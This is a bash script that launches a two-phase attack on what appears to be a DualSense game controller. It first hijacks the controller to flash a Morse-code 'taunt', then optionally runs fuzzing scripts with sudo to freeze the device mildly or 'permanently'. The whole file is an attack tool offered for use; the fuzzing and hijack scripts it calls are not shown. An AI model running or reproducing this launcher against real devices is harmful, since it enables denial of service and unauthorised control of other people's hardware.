#!/bin/bash

# This script orchestrates the two-phase controller attack.
# Phase 1: "Taunt" (Morse Code Hijack) - Always runs.
# Phase 2: "DOS" (Physical Attack) - Controlled by $2.

# $1: The message to send (e.g., "DOSSED")
# $2: DOS flag (0 = Skip DOS, 1 = Mild DOS, 2 = Extreme DOS)

MESSAGE="$1"
DOS_FLAG="$2"

# --- Input Validation ---
# Check 1: Check if all three arguments are present
if [ -z "$MESSAGE" ] || [ -z "$DOS_FLAG" ]; then
    echo "Error: Missing arguments."
    echo "Usage: ./attack_ds5.sh <message> <dos_flag>"
    echo "Example: ./attack_ds5.sh \"DOSSED\" 2"
    echo "Example: ./attack_ds5.sh \"SOS\" 0"
    exit 1
fi

# Check 2: Validate message (only letters and spaces allowed)
if echo -n "$MESSAGE" | grep -q "[^A-Za-z ]"; then
    echo "Error: Invalid message."
    echo "Argument 1 must contain only letters (A-Z, a-z) and spaces."
    exit 1
fi

# Check 3: Validate DOS flag (only 0, 1, or 2 allowed)
if ! [[ "$DOS_FLAG" == "0" || "$DOS_FLAG" == "1" || "$DOS_FLAG" == "2" ]]; then
    echo "Error: Invalid DOS flag."
    echo "Argument 2 must be '0' (None), '1' (Mild), or '2' (Extreme)."
    exit 1
fi
# ------------------------------

echo "--- [PHASE 1: TAUNT (Hijack)] ---"
echo "Sending message in Morse code: $MESSAGE"
echo "-----------------------------------"

# Run the "polite" taunt script as the normal user
python3.13 taunt.py "$MESSAGE"

# Check if the taunt script finished successfully
if [ $? -ne 0 ]; then
    echo "Phase 1 (Taunt) failed. Aborting attack."
    exit 1
fi

echo ""
echo "--- [PHASE 2: DOS ATTACK] ---"
echo "-------------------------------"

case "$DOS_FLAG" in
    0)
        echo "DOS_FLAG set to 0. Skipping attack phase."
        ;;
    1)
        echo "MODE: MILD DOS (Intermittent Freeze/Recovery)"
        echo "To measure latency, run 'python3.13 latency_analyzer.py' in a separate terminal."
        echo "Launching fuzz_ds5_mild.py (requires sudo)..."
        # Mild DOS requires sudo for driver detach/reset
        sudo python3.13 fuzz_ds5_mild.py
        ;;
    2)
        echo "MODE: EXTREME DOS (Permanent Freeze)"
        echo "Launching fuzz_ds5.py (requires sudo)..."
        # Extreme DOS requires sudo for driver detach/reset
        sudo python3.13 fuzz_ds5.py
        ;;
esac

echo "Attack sequence complete."
